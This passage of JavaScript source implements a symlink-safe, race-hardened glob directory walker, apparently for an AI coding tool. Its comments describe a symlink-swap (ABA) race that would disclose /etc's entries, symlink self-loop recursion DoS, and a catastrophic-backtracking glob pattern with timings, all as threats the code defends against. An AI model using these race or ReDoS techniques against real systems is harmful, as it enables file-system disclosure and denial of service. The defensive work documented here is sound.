 * @param {{realRoot: string, matchers: Array, cwdRealCache: Map, cwdCacheTtl: number, state: {stop: string|null, visited: number}, results: string[], maxEntries: number, directoryOnly?: boolean}} args
 */
async function walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results, maxEntries, directoryOnly, __testDescendSeam }) {
  const m = matchers.length
  // SECURITY/DoS (#7910 review round 2) — real directories on the CURRENT
  // descent path (root down to here), keyed by `dev:ino`. A plain filesystem
  // tree can never revisit an ancestor directory — that would require an
  // actual cycle — so tracking every descent unconditionally costs nothing
  // there and only ever REFUSES when a symlink's resolved target is already
  // an ancestor of the entry naming it, which is exactly the shape measured
  // directly here: `**/selfloop/**` against `selfloop -> .` (self-referential)
  // grew UNBOUNDED on the round-2 code (200+ matches, no cap but `maxEntries`/
  // the componentwise resolver's own symlink-depth ceiling) because the
  // existing `detHandoff`/`canDescendSymlink` gate answers "was this entry
  // named determinately", not "have we already been here" — a determinate
  // literal segment re-matching the SAME repeating name at every depth of its
  // own self-loop sails through that gate every time. Stack discipline (added
  // in `walk`, removed in its `finally`) means a real DIAMOND — the same real
  // directory reached via two separate, non-overlapping symlinks elsewhere in
  // the tree — is not spuriously refused; only an actual ancestor-revisit is.
  const visitedDirs = new Set()
  // `{ bigint: true }` stats (see `openVerifiedDirForDescend`) — a plain
  // Number would lose precision for a large volume's inode, and this key
  // needs exact equality: a false COLLISION (two different directories
  // hashing the same key) would wrongly refuse a legitimate descent — safe
  // (fail-closed), but not correct — while precision here is free.
  function dirKey(stat) { return `${stat.dev}:${stat.ino}` }
  // #7910 review (parity/DoS) — precomputed ONCE per Glob call: which matcher
  // positions are DETERMINATE segments (no bare `*`/`?` anywhere in the
  // segment — a fully-literal segment, a bracket class, or a brace whose every
  // alternative is itself determinate; `**` is never determinate). Verified
  // directly against Node 22's `glob()`: it follows a symlinked directory, and
  // lets a trailing `**` close with zero width onto a non-directory entry,
  // when the segment that named that entry is determinate (`src-link/*`,
  // `[s]rc-link/*`, `{src-link,x}/*`, `plainfile.txt/**`, `[p]lainfile.txt/**`
  // all do) but refuses when it is not (`?rc-link/*`, `*/*`, `*.txt/**`,
  // `pl?infile.txt/**` do not) — see `walk`'s two call sites below.
  const determinateSegment = matchers.map((tok) => tok !== CASE_CHECK_GLOBSTAR && isDeterminateSegmentTokens(tok))

  // #7912 — precomputed ONCE per Glob call, alongside `determinateSegment`:
  // for each `**` position `k`, the index of the first REAL (non-`**`)
  // matcher after it, skipping over any further consecutive `**`s, or `m`
  // when none remains (a trailing `**`, or a run of `**`s with nothing after
  // it). Drives the dot-crossing rule just below — see its doc.
  const nextNonGlobstar = matchers.map((tok, k) => {
    if (tok !== CASE_CHECK_GLOBSTAR) return -1
    let j = k + 1
    while (j < m && matchers[j] === CASE_CHECK_GLOBSTAR) j++
    return j
  })

  // #7916 — precomputed ONCE per Glob call: does this pattern contain a `**`
  // anywhere? Gates whether `openVerifiedDirForDescend`'s ancestor-cycle
  // refusal (`visitedDirs`, added in #7910 review round 2 for a real,
  // measured DoS) applies at all — see that function's `enforceCycleGuard`
  // doc for why a pattern with NO `**` can never need it: every non-`**`
  // matcher consumes exactly one real path segment, so a walk driven purely
  // by such matchers can never recurse deeper than `m` (the pattern's own
  // segment count) REGARDLESS of how many times a symlink resolves back to
  // an ancestor directory — the recursion DEPTH is bounded by pattern
  // length, not by directory structure. Its BREADTH is not (#7918 review):
  // K self-loops in one directory under a determinate `{l1,...,lK}/`
  // alternation repeated D times open K^D directories — measured K=8, D=6:
  // the 30s deadline, event loop never blocked more than ~7ms. That is the
  // same fan-out an ACYCLIC lattice of D directories with K symlinks each
  // already produced (measured identically: 30s deadline), which this guard
  // never refused because nothing in it is an ancestor; `maxEntries` and the
  // deadline bound both. A pattern with even one `**` keeps the existing,
  // unchanged, fully-enforced guard (round 2's own DoS regression test below
  // uses `**/selfloop/**`, which still hits this branch every time).
  const hasGlobstar = matchers.includes(CASE_CHECK_GLOBSTAR)

  function closeGlobstars(active) {
    for (let k = 0; k < m; k++) {
      if (active[k] && matchers[k] === CASE_CHECK_GLOBSTAR) active[k + 1] = true
    }
    return active
  }

  function shouldStop() {
    return state.stop !== null || results.length >= GLOB_COLLECT_CEILING
  }

  async function walk(dirAbs, relPrefix, active, preOpened) {
    // `preOpened` (`{dh, key, fh}`) — #7910 review round 2 (TOCTOU) — every
    // recursive call below already went through `openVerifiedDirForDescend`,
    // which opened AND identity-verified this exact directory itself;
    // opening it a SECOND time here, by path, would throw that verification
    // away and reintroduce the very race it exists to close (see that
    // function's doc). Only the top-level call (the walk's `realRoot`,
    // resolved once by the caller before any concurrent tool call could
    // interfere with it) opens fresh. A pre-opened handle must still be
    // closed on the early-stop path below — it is already-open regardless of
    // whether `walk` goes on to use it. `fh` (#7910 review round 3) — present
    // only on the platforms where `dh` was reopened from an already-verified
    // fd (see `openVerifiedDirForDescend`'s "ABA" doc) — must stay open for
    // exactly as long as `dh` is in use, since `dh`'s entries are read
    // through it, and is closed alongside `dh` everywhere `dh` is closed.
    if (shouldStop()) {
      if (preOpened) {
        await preOpened.dh.close().catch(() => {})
        if (preOpened.fh) await preOpened.fh.close().catch(() => {})
      }
      return
    }
    let dh = preOpened?.dh
    let key = preOpened?.key
    let fh = preOpened?.fh
    if (!dh) {
      try {
        dh = await opendir(dirAbs)
      } catch {
        return // unreadable or gone — FAIL CLOSED: no children found, never a crash
      }
      // SECURITY/DoS (#7910 review round 2) — only the TOP-LEVEL (root) call
      // reaches here without a `preOpened.key` already computed by
      // `openVerifiedDirForDescend`; register the root itself so a symlink
      // ANYWHERE in the tree that resolves back to it is also caught as a
      // cycle, not just a loop among its descendants.
      try {
        key = dirKey(await lstat(dirAbs, { bigint: true }))
      } catch {
        await dh.close().catch(() => {})
        return
      }
    }
    visitedDirs.add(key)
    try {
      for await (const dirent of dh) {
        if (shouldStop()) return
        state.visited++
        if (state.visited > maxEntries) { state.stop = 'too many entries'; return }

        const name = dirent.name
        const next = new Array(m + 1).fill(false)
        // `detHandoff[k+1]` — #7910 review — true when `next[k+1]` was set
        // THIS STEP by a determinate, non-globstar segment explicitly
        // matching `name` (as opposed to a `**`'s own absorption, or a
        // non-determinate `*`/`?` match). Drives both call sites below.
        const detHandoff = new Array(m + 1).fill(false)
        // Did the TRAILING globstar (if any) legitimately absorb THIS entry's
        // own name via its dot-guarded absorption test? If so, it consumed
        // the entry itself and needs no determinate source to close on it —
        // see the closure-gate doc below.
        let globstarAbsorbedLast = false
        for (let k = 0; k < m; k++) {
          if (!active[k]) continue
          if (matchers[k] === CASE_CHECK_GLOBSTAR) {
            // #7912 — `**` does not, in general, absorb a hidden entry (see
            // parseSegmentTokens's DOT HANDLING doc; matches fs.glob's own
            // default of never listing a dotfile/dotdir at any depth for a
            // BARE `**`). The one exception, verified directly against Node
            // 22's `glob()` (`internal/fs/glob.js`'s own GLOBSTAR handling —
            // `isDot`/`matchesDot`/`nextNonGlobIndex`): a dot-named entry IS
            // visible to `**` when the pattern segment immediately following
            // this run of `**`s (skipping over any further `**`s —
            // `nextNonGlobstar[k]`, precomputed above) EXPLICITLY matches
            // that entry's own name. This is why `**/.*` finds
            // `.hidden/.deepdot` (`.*` matches both `.hidden`, letting `**`
            // cross it, and then `.deepdot` two levels down) while
            // `**/.deepdot` (a plain literal tail) finds nothing (`.deepdot`
            // the literal does not equal `.hidden`, so `**` never even
            // crosses into it to look) and `**/*` never crosses any dot
            // directory at all (a bare `*` never matches a dot name — see
            // the acceptance note on `walkGlob`'s doc). A trailing `**` (no
            // segment after it, `nextNonGlobstar[k] === m`) always keeps the
            // original, unconditional refusal — there is no "next segment"
            // to grant the exception.
            const dotOk = name[0] !== '.' || (
              nextNonGlobstar[k] < m && segmentMatches(matchers[nextNonGlobstar[k]], name)
            )
            if (dotOk) {
              next[k] = true
              if (k === m - 1) globstarAbsorbedLast = true
            }
          } else if (segmentMatches(matchers[k], name)) {
            next[k + 1] = true
            if (determinateSegment[k]) detHandoff[k + 1] = true
          }
        }
        closeGlobstars(next)

        // #7901 round 2 (Windows parity) — `join()`, not a hardcoded `/`, so
        // the result carries the PLATFORM-native separator (`\` on Windows),
        // matching what the pre-#7901 walk returned via `path.relative()`
        // (also platform-native) rather than silently switching Windows Glob
        // results from `sub\file.ts` to `sub/file.ts`. `join('', name)`
        // collapses to plain `name` (verified: no leading separator), so this
        // needs no separate empty-prefix branch.
        const relPath = join(relPrefix, name)
        const isSymlink = dirent.isSymbolicLink()
        let childAbs
        if (isSymlink) {
          let resolved
          try {
            resolved = await validateRawPathWithinCwd(relPath, realRoot, cwdRealCache, cwdCacheTtl)
          } catch {
            resolved = null // FAIL CLOSED — ELOOP, EACCES, etc. withhold, never trust
          }
          if (!resolved || !resolved.valid) continue
          childAbs = resolved.realPath
        } else {
          childAbs = join(dirAbs, name)
        }

        // SECURITY/DoS (#7910 review, item 3 — corrected in round 2) — a
        // TRAILING `**` closing with ZERO width (matching no real segment of
        // its own) onto a NON-directory entry is only valid when the entry
        // that immediately precedes the close was named by a DETERMINATE
        // segment (verified directly: `plainfile.txt/**`/`[p]lainfile.txt/**`
        // match a plain FILE `plainfile.txt`; `pl?infile.txt/**`/`*.txt/**`
        // do not — same rule for a symlink: `[f]ile-link.txt/**` matches a
        // symlink to a FILE exactly like a plain file does, verified
        // directly) — or when the globstar legitimately ABSORBED this
        // entry's own name via its own dot-guarded test
        // (`globstarAbsorbedLast`; that case needs no gate at all, since the
        // entry was genuinely consumed as a real segment, file or directory,
        // same as any ordinary `**` leaf match — `sub/**` finding a plain
        // file `sub/file.ts` is completely ordinary). A PLAIN directory
        // entry never needs the determinate check at all: `**` matching
        // zero of a real directory's contents is always well-formed,
        // determinate or not. A SYMLINK entry is NOT automatically
        // "dir-like" the way round 2's original `isDirLike =
        // dirent.isDirectory() || dirent.isSymbolicLink()` treated it — that
        // unconditionally exempted EVERY symlink from this gate regardless
        // of what named it, letting `*/**`/`?rc-link/**`/`[s]*-link/**` (all
        // NON-determinate — `[s]*-link` contains a bare `*` token, so
        // `isDeterminateSegmentTokens` correctly still calls the whole
        // segment non-determinate) spuriously close zero-width onto a
        // symlinked directory, and `*.txt/**` onto a symlinked FILE, none of
        // which real `fs.glob` does (verified directly: all four give zero
        // matches). Unlike the DESCEND decision below, target type (file vs
        // directory) does NOT gate this closure — `detHandoff[m-1]` alone
        // is the exact line `fs.glob` draws here, same as a plain file.
        if (next[m] && m >= 1 && matchers[m - 1] === CASE_CHECK_GLOBSTAR && !globstarAbsorbedLast) {
          const closesWithZeroWidth = isSymlink ? detHandoff[m - 1] : (dirent.isDirectory() || detHandoff[m - 1])
          if (!closesWithZeroWidth) next[m] = false
        }

        // SECURITY/parity (#7910 review round 2; refined #7917) — a pattern
        // ending in `/` (`directoryOnly`, from `runGlob`) means directories
        // only. For an ORDINARY entry this is `dirent.isDirectory()`,
        // matching `fs.glob` exactly: verified directly, a symlink pointing
        // AT a directory reached only by a NON-determinate segment (`*/`,
        // `?irlink/`) is still excluded — same as a plain file. #7917 — but
        // verified directly, `fs.glob`'s own trailing-slash filter draws a
        // SECOND distinction its own source (`internal/fs/glob.js`'s
        // `Pattern#isLast`/the literal-string result branch) does not apply
        // any directory check to at all: a symlink named by a DETERMINATE
        // segment (`src-link/`, `[d]irlink/`, even `filelink.txt/` — a
        // symlink to a plain FILE) is matched with NO type check whatsoever,
        // not even "does the target resolve to a directory". `detHandoff[m]`
        // (already computed above, per entry, for the zero-width-closure
        // gate) is exactly "was this entry's own name matched THIS step by a
        // determinate, non-globstar segment", so it is reused here rather
        // than re-derived.
        if (next[m] && (!directoryOnly || dirent.isDirectory() || (isSymlink && detHandoff[m]))) results.push(relPath)
        if (shouldStop()) return

        let canContinuePattern = false
        for (let k = 0; k < m; k++) { if (next[k]) { canContinuePattern = true; break } }
        // SECURITY/DoS (#7910 review, item 1) — a SYMLINKED directory is only
        // descended into when SOME active, non-globstar, DETERMINATE segment
        // explicitly matched this entry's name this step (`detHandoff`).
        // Verified directly against Node 22's `glob()`: `src-link/*`,
        // `src-link/**`, `[s]rc-link/*`, `{src-link,x}/*` all follow a
        // symlinked `src-link`; `?rc-link/*`, `*/*` do not. A symlinked
        // directory reached ONLY via `**` absorption (bare `**`, never
        // descends past a symlink — the standard reason `**` needs symlink
        // protection at all, to bound recursion) or ONLY via a
        // non-determinate wildcard is listed as a match above but never
        // opened — this is also what makes a symlink self-loop (`a -> .`)
        // terminate after exactly the literal-segment chain the PATTERN
        // itself spells out, rather than being re-discovered at every `**`
        // depth. A plain (non-symlink) directory is unaffected — recursing
        // into an ordinary directory carries no symlink risk regardless of
        // how it was reached.
        const canDescendSymlink = !isSymlink || detHandoff.slice(0, m).some(Boolean)
        if (canContinuePattern && canDescendSymlink && (dirent.isDirectory() || isSymlink)) {
          // SECURITY (review of #7901 round 2, TOCTOU) — `childAbs` (for a
          // symlink-flagged entry, `resolved.realPath` from the
          // `validateRawPathWithinCwd` call above; for a plain-directory-
          // flagged one, a plain `join`) is a DECISION, not a proof that
          // survives to the `opendir` about to happen — some real time still
          // elapses between deciding "this is what we'd open" and actually
          // opening it (at minimum, the `await` boundary below; `dirent`'s
          // own type can already be stale before this line even runs, see
          // `openVerifiedDirForDescend`'s doc). Route through it rather than
          // opening `childAbs` directly, so the open and the LAST identity
          // check that vouches for it are inseparable — no path is ever
          // handed back for a caller to re-resolve blind.
          const descend = await openVerifiedDirForDescend(
            childAbs, relPath, realRoot, cwdRealCache, cwdCacheTtl, isSymlink, visitedDirs, dirKey, hasGlobstar, __testDescendSeam,
          )
          if (descend) await walk(descend.path, relPath, next, { dh: descend.dh, key: descend.key, fh: descend.fh })
        }
      }
    } finally {
      visitedDirs.delete(key)
      await dh.close().catch(() => {})
      if (fh) await fh.close().catch(() => {})
    }
  }

  const initial = new Array(m + 1).fill(false)
  initial[0] = true
  closeGlobstars(initial)
  await walk(realRoot, '', initial)
}

/**
 * SECURITY (review of #7901 round 3, the ABA hole in round 2's identity
 * check) — open AND identity-verify a directory for `walk` to descend into,
 * for EITHER a symlink-flagged entry or a plain-directory-flagged one.
 *
 * ── The hole round 2 left open ──────────────────────────────────────────
 *
 * Round 2 (`lstat(target)` → `opendir(target)` → `lstat(target)` again →
 * compare dev/ino of the two `lstat`s) verified the PATH, twice, but never
 * inspected the object `opendir` actually opened. That is an ABA gap, not a
 * check-then-use gap: an attacker who (1) swaps `target` for a symlink to
 * `/etc` between the pre-open `lstat` and `opendir` — so `opendir` follows
 * it and returns a `Dir` for `/etc` — and then (2) swaps the real directory
 * BACK before the post-open `lstat` runs, sails through both comparisons:
 * both `lstat`s see the legitimate directory, dev/ino match, and the
 * already-`/etc`-bound `Dir` is handed to `walk` and iterated, disclosing
 * `/etc`'s entries under a workspace-looking `relPath`. Chroxy's concurrent
 * per-turn tool dispatch (`byok-session.js`'s `Promise.all`, #7356) gives an
 * attacker-controlled Bash call approved in the same turn the real time to
 * land both swaps while a Glob walk is busy elsewhere in the tree.
 *
 * ── The fix: verify the OPENED object, not the path ─────────────────────
 *
 * `openNoFollow` (`ws-file-ops/open-nofollow.js`, #7280 — the one
 * symlink-refusing `open()` for this codebase) opens `target` with
 * `O_DIRECTORY` and, on every platform it can, `O_NOFOLLOW` enforced
 * ATOMICALLY by the kernel: if a symlink sits at `target` at the instant of
 * this call — including the ABA's first swap — the open fails outright,
 * `ELOOP`, before anything is read. There is no window afterward in which
 * "swapping back" can retroactively legitimize an open that never happened.
 * The returned `FileHandle` is then `fstat`ed (`{ bigint: true }`, on the fd
 * itself — not a fresh `lstat` by path) and compared to the PRE-open
 * `lstat`: this is the identity of what was actually opened, not of
 * whatever currently sits at the path, which is exactly what round 2's
 * two-`lstat` comparison was missing. This closes the described attack
 * fully — no "swap back" step is ever reachable, because step 1 alone
 * already fails closed.
 *
 * ── Listing: reusing the verified fd where the platform allows it ───────
 *
 * `fs.promises.opendir` accepts only a path, never an fd (verified
 * directly: passing one throws `ERR_INVALID_ARG_TYPE`), so getting `Dir`
 * entries FROM the already-verified handle — rather than a second, path-based
 * open that reintroduces a (smaller) version of the same race — needs an
 * OS-level trick. On **Linux**, `opendir('/proc/self/fd/' + fh.fd)` reopens
 * through the SAME open file description via the kernel's magic-symlink
 * `/proc` entries — verified directly (Docker `node:22-alpine`): entries
 * read this way match the directory at open time even after the original
 * path is renamed aside and replaced with a symlink to an attacker
 * directory afterward, i.e. it is bound to the fd, not re-resolved by path.
 * `fh` is kept open for as long as `dh` is (see `walk`'s `preOpened.fh`) —
 * closing it early would invalidate the magic-symlink target.
 *
 * **macOS has no equivalent** — verified empirically on this exact host,
 * both via Node (`fs.promises.opendir('/dev/fd/' + fh.fd)`) and via a plain
 * shell (`ls -la /dev/fd/N` on an fd opened by `exec N< dir`): both fail
 * `ENOTDIR`, even though `stat()` of that same `/dev/fd/N` path correctly
 * reports it as a directory. This is a devfs limitation (macOS's `/dev/fd`
 * dup-on-open only supports regular files), not a Node bug, and `fs.Dir`
 * exposes no fd a caller could `fstat`/rebind through any other public API.
 * **Windows has no `/proc`-like construct at all.** On both, listing falls
 * back to a second, path-based `opendir(target)`, immediately followed by
 * round 2's original post-open `lstat`-compare (kept, not removed — same
 * fail-closed-on-any-mismatch shape as before).
 *
 * RESIDUAL RISK, stated rather than implied, for macOS/non-Linux platforms
 * ONLY: the `openNoFollow` check above closes the SPECIFIC attack this
 * function's doc leads with (swap-to-symlink, then swap back) universally,
 * on every platform, because that attack needs step 1's open to SUCCEED
 * despite the symlink, and it does not. What remains possible on
 * non-Linux, and is NOT closed, is a *narrower, single-swap* variant: the
 * directory is genuinely real and unswapped through the `openNoFollow`
 * verification (no ABA needed to pass it), and the attacker plants a
 * symlink for the FIRST time in the short gap between that verification
 * succeeding and the fallback's own `opendir(target)` call. That call has
 * no `O_NOFOLLOW` equivalent (Node's `opendir` accepts no flags), so it
 * would follow the symlink — caught, as before, by the immediate
 * `lstat`-compare that follows it, UNLESS the attacker also restores the
 * real directory before that specific `lstat` runs, which is the same
 * inode-identity requirement — and the same accepted residual — already
 * documented for `openNoFollow`'s own win32 emulation branch (#7874/#7280).
 * This residual window is real but categorically smaller than round 2's:
 * it requires a fresh, precisely-timed swap landing in a few-microsecond
 * gap between two back-to-back `await`s with no attacker-observable signal
 * in between, not a swap-then-restore spanning this whole function.
 *
 * `isKnownSymlink` — true when `dirent` was ALREADY flagged as a symlink at
 * listing time and `candidateAbs` is therefore already the confinement-
 * validated `resolved.realPath` from the `validateRawPathWithinCwd` call in
 * `walk` (skips the redundant re-lstat-and-resolve below; the pre-open
 * identity check still runs against the resolved target). False for a
 * plain-directory-flagged entry, where `candidateAbs` has not been
 * re-checked since `dirent` was read and may itself now BE a symlink — that
 * case is routed through the same `validateRawPathWithinCwd` confinement
 * check the originally-flagged-symlink branch already has, rather than
 * trusted on `dirent`'s stale word. Either way, both branches funnel into
 * the SAME `openNoFollow`-based verified-open below — there is exactly one
 * implementation of "open and verify", not two.
 *
 * `__testSeam(target, phase)`, if given, is awaited at THREE points — the
 * ONLY way to hit any of these windows deterministically in a test; a real
 * concurrent race is flaky by construction (see the test file): `'before-open'`
 * immediately before the `openNoFollow` call (the pre-open check-to-open
 * window); `'after-open'` (new, #7910 review round 3) immediately after
 * `openNoFollow` + the fstat-identity check have PASSED and before entries
 * are read — proving a swap landing AFTER a successful, verified open does
 * not retroactively corrupt what was already opened; and `'after-verify'`
 * immediately before the already-open `Dir` is returned to `walk`.
 *
 * SECURITY/DoS (#7910 review round 2) — `visitedDirs`/`dirKey` add a SECOND,
 * independent check alongside the identity one above: once the open is
 * verified, its `dev:ino` is checked against the set of real directories
 * already on the CURRENT descent path (root down to the caller). A hit
 * means this entry's real target is its OWN ancestor — an actual symlink
 * cycle (`selfloop -> .`), not merely a diamond (the same real directory
 * reached twice via two separate, non-overlapping symlinks, which is NOT
 * refused, since `visitedDirs` is path-scoped by `walk`'s own push/pop, not
 * global to the whole walk). Refusing here, BEFORE `walk` ever touches this
 * `Dir`'s entries, is what closes the DoS `walkGlob`'s existing
 * `detHandoff`/`canDescendSymlink` gate does not: that gate answers "was
 * this entry named by a determinate segment", which a self-loop's REPEATING
 * name satisfies at every depth it is encountered, forever — see `walkGlob`'s
 * `visitedDirs` doc for the measured blowup this replaces.
 *
 * `enforceCycleGuard` (#7916 — parity gap, partial fix) — `walkGlob`'s own
 * `hasGlobstar` (see its doc): when the WHOLE pattern contains no `**` at
 * all, the ancestor-cycle refusal above is skipped for this call. A
 * `**`-free pattern's `m` non-globstar matchers each consume exactly one
 * real path segment to advance, so `walk`'s own recursion can never go
 * deeper than `m` real levels — a hard bound from the pattern's own,
 * already-length-capped segment count (`globPatternComplexityReason`),
 * independent of anything the filesystem's symlink structure does. A
 * `sub/selfloop/file.txt`-shaped pattern (three literal segments, no
 * wildcard) can therefore re-enter `sub` via `selfloop` at most as many
 * times as the pattern spells it out — never unboundedly — which is exactly
 * the fs.glob-parity gap #7916 files: `visitedDirs` was refusing this
 * fully-determinate, finite re-entry. The bound is on DEPTH only: a
 * determinate alternation over several self-loops still fans out
 * exponentially in the pattern's length, exactly as an acyclic symlink
 * lattice always could (see `walkGlob`'s `hasGlobstar` comment for the
 * measurement) — `maxEntries` and the deadline bound that, not this check.
 * A pattern containing even one `**` anywhere keeps the FULL, unchanged
 * check — `**`'s own open-ended absorption is precisely the mechanism the
 * round-2 fix exists for, and nothing here weakens it (the round-2
 * regression test below, `**\/selfloop\/**`, has a `**` and so always takes
 * `hasGlobstar === true`). This is a PARTIAL fix for #7916: it does not
 * address the issue's other half (a `**` immediately followed by more
 * pattern following a symlink reached via a non-determinate segment,
 * `**\/*` missing `src-link/index.ts`) or the globstar-terminated variant of
 * this same re-entry (`sub/selfloop/selfloop/**`) — both stay refused,
 * unchanged, and #7916 stays open for them.
 *
 * @returns {Promise<{dh: import('fs/promises').Dir, path: string, key: string, fh: import('fs/promises').FileHandle|null}|null>}
 */
const DIR_FD_REOPEN_SUPPORTED = process.platform === 'linux'

async function openVerifiedDirForDescend(candidateAbs, relPath, realRoot, cwdRealCache, cwdCacheTtl, isKnownSymlink, visitedDirs, dirKey, enforceCycleGuard, __testSeam) {
  let target = candidateAbs
  let preStat = null
  if (!isKnownSymlink) {
    try {
      preStat = await lstat(candidateAbs, { bigint: true })
    } catch {
      return null // gone since it was listed — nothing to descend into
    }
    if (preStat.isSymbolicLink()) {
      // Became a symlink since `dirent` was read — resolve+confine it exactly
      // like the originally-flagged-symlink branch in `walk` does, instead of
      // trusting `candidateAbs` as a plain directory.
      let resolved
      try {
        resolved = await validateRawPathWithinCwd(relPath, realRoot, cwdRealCache, cwdCacheTtl)
      } catch {
        resolved = null // FAIL CLOSED — ELOOP, EACCES, etc.
      }
      if (!resolved || !resolved.valid) return null
      target = resolved.realPath
      preStat = null // that lstat was for the OLD path — the resolved target needs its own
    } else if (!preStat.isDirectory()) {
      return null // no longer a directory (e.g. swapped for a plain file) — nothing to open
    }
  }

  if (!preStat) {
    try {
      preStat = await lstat(target, { bigint: true })
    } catch {
      return null
    }
    if (preStat.isSymbolicLink() || !preStat.isDirectory()) return null
  }

  if (__testSeam) await __testSeam(target, 'before-open')

  // The ABA fix: open with O_NOFOLLOW|O_DIRECTORY (atomic on every platform
  // `openNoFollow` supports — real kernel enforcement on POSIX, a
  // check-open-recheck emulation on win32) and verify identity against the
  // pre-open `lstat` via `fstat` ON THE OPENED HANDLE, never a fresh `lstat`
  // by path. See the doc above for exactly why this closes the round-2 gap.
  let fh
  try {
    fh = await openNoFollow(target, fsConstants.O_RDONLY | fsConstants.O_DIRECTORY)
  } catch {
    return null // symlink, gone, or otherwise unopenable at this instant — FAIL CLOSED
  }
  let openedStat
  try {
    openedStat = await fh.stat({ bigint: true })
  } catch {
    await fh.close().catch(() => {})
    return null
  }
  const sameObject =
    openedStat.isDirectory() &&
    openedStat.ino !== 0n &&
    openedStat.dev === preStat.dev &&
    openedStat.ino === preStat.ino
  if (!sameObject) {
    // The object actually opened is not the one we checked — withhold
    // rather than trust it. Nothing has been read from it yet.
    await fh.close().catch(() => {})
    return null
  }

  if (__testSeam) await __testSeam(target, 'after-open')

  const key = dirKey(openedStat)
  if (enforceCycleGuard && visitedDirs.has(key)) {
    // Cycle: this real directory is already an ancestor on the CURRENT
    // descent path (#7910 review round 2, DoS). Not a diamond — a diamond's
    // target is not yet in `visitedDirs` because `walk` only holds a key
    // while it is actively inside that directory (or one of its
    // descendants), never after backtracking out of it. #7916 — this check
    // is skipped entirely (`enforceCycleGuard === false`) for a `**`-free
    // pattern; see this function's own doc for why that is bounded.
    await fh.close().catch(() => {})
    return null
  }

  if (DIR_FD_REOPEN_SUPPORTED) {
    // Linux: read entries from the SAME open file description — no further
    // path lookup, no further race, ever. See the doc above for the direct
    // verification that this survives the original path being swapped away.
    let dh
    try {
      dh = await opendir(`/proc/self/fd/${fh.fd}`)
    } catch {
      await fh.close().catch(() => {})
      return null
    }
    if (__testSeam) await __testSeam(target, 'after-verify')
    return { dh, path: target, key, fh }
  }

  // Fallback (macOS/win32/other — no fd-bound reopen available): a second,
  // path-based `opendir`, immediately re-verified with round 2's original
  // lstat-compare. See the RESIDUAL RISK paragraph above for exactly what
  // narrow window this does — and does not — close on these platforms.
  let dh
  try {
    dh = await opendir(target)
  } catch {
    await fh.close().catch(() => {})
    return null
  }
  let postStat
  try {
    postStat = await lstat(target, { bigint: true })
  } catch {
    await dh.close().catch(() => {})
    await fh.close().catch(() => {})
    return null
  }
  const stillSameObject =
    !postStat.isSymbolicLink() &&
    postStat.ino !== 0n &&
    postStat.dev === preStat.dev &&
    postStat.ino === preStat.ino
  await fh.close().catch(() => {}) // not used for listing on this path — release it now
  if (!stillSameObject) {
    await dh.close().catch(() => {})
    return null
  }
  if (__testSeam) await __testSeam(target, 'after-verify')
  return { dh, path: target, key, fh: null }
}

/**
 * #7355 — parse a single glob PATTERN SEGMENT (no `/`) into a token array for
 * {@link segmentMatches}. Scope is exactly the syntax
 * {@link GLOB_PATTERN_SHELL_METACHARS} lets through to `fs.glob`: `*`, `?`,
 * `[...]`/`[!...]`/`[^...]` bracket expressions (with `-` ranges), and
 * `{a,b}` brace alternation (recursive — an alternative may itself contain
 * any of the above, including nested braces). No backslash escapes: `\` is
 * rejected from every Glob pattern upstream, so none are interpreted here
 * either — every other character is a literal.
 *
 * #7898 (this fix) — this used to compile straight to a `RegExp` (`*`/`?` as
 * `[\s\S]*`/`[\s\S]`, `{a,b}` as `(?:a|b)`), tested via `RegExp#test` in
 * {@link caseCheckPasses}. That is a BACKTRACKING regex: a segment shaped
 * like `*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b` tested against a REAL
 * on-disk name that almost-but-doesn't match (`'a'.repeat(n)`, no trailing
 * `b`) is the textbook catastrophic-backtracking shape — measured: 0.03ms at
 * n=20, 811ms at n=30, 5.9s at n=32, and it only gets worse from there (each
 * +2 chars roughly 7-8x's the previous run). This check runs SYNCHRONOUSLY,
 * once per real directory entry `walkGlob` (#7901) reads, interleaved with
 * `runGlob`'s own 30s walk-timeout race rather than after it — but a single
 * over-budget call would still block the event loop for its own duration
 * regardless of the race around it, so nothing upstream of the complexity cap
 * below may assume this check is cheap. `**`-count no longer fails this class
 * of pattern closed before reaching the regex either (that was this exact
 * defect class's OWN prior fix, in this same commit, removing the `ambiguous`
 * short-circuit for 2+ `**` segments) — so every pattern shape now reaches
 * this segment matcher, which is why it has to be safe on its own rather than
 * relying on an upstream fail-closed path to shield it.
 *
 * The replacement is a token list consumed by an iterative, non-backtracking
 * DP ({@link segmentMatches}) — the same technique {@link caseCheckPasses}
 * already uses one level up for `**` across path segments, just applied one
 * level down, per CHARACTER, to `*`/`?` within a single segment. Verified
 * behaviorally identical to the former regex compiler across 20,000 random
 * (pattern, string) pairs before this fix landed, and safe: n=5000 against
 * the exact pathological pattern above now takes ~5ms, not "does not finish".
 *
 * `*`/`?` match a literal newline within a segment too (a filename may
 * legally contain one — see #7357): the DP advances by testing `str[j]`
 * directly against no character at all (`any`/`star`), never through a `.`-
 * style regex metachar that would need `[\s\S]` to include `\n` — matching
 * every character, newlines included, needs no special-casing here.
 *
 * DOT HANDLING (#7901) — added when `walkGlob` became this matcher's OWN
 * candidate source rather than a post-hoc re-check over candidates `fs.glob`
 * already filtered. `fs.glob`'s default (verified directly against Node 22's
 * `glob()`) never lets a bare `*`, `?`, or an ordinary bracket class stand for
 * a REAL segment's leading dot: `*.ts` does not match `.env`, `?env` does
 * not, `[.a]env`/`[a.]env` (a class with more than one member, even when `.`
 * is one of them) does not, `[^a]env`/`[!a]env` (a negated class that would
 * incidentally accept `.` under ordinary regex semantics) does not — only a
 * LITERAL leading `.` (`.env*`, `.[a-z]*`) reaches a dotfile, with exactly one
 * observed exception: `[.]` — a non-negated class whose SOLE member is a
 * literal dot — is privileged the same as a literal `.` (`[.]env` matches
 * `.env`); a class with any other member alongside the dot is not. This is
 * encoded as `soleDot` on a `class` token ({@link parseBracketExpr}) and
 * enforced by {@link advanceToken}'s dot guard, which triggers ONLY at real
 * offset 0 — everywhere else a `.` is an ordinary character, matched like any
 * other. `**` gets no such exception ever (it carries no literal text of its
 * own to be "explicit" with): see {@link walkGlob}'s own dot check.
 */
function parseSegmentTokens(seg) {
  const tokens = []
  // #7951 review — every `{` this loop reaches asks where its group closes.
  // Answered from ONE bracket-aware pairing pass over the segment, built on
  // first use, instead of one forward rescan per `{` — see braceCloseTable's
  // doc for the measured cubic cost a per-`{` rescan has once pairing skips
  // bracket expressions.
  let closeTable = null
  let i = 0
  while (i < seg.length) {
    const c = seg[i]
    if (c === '*') {
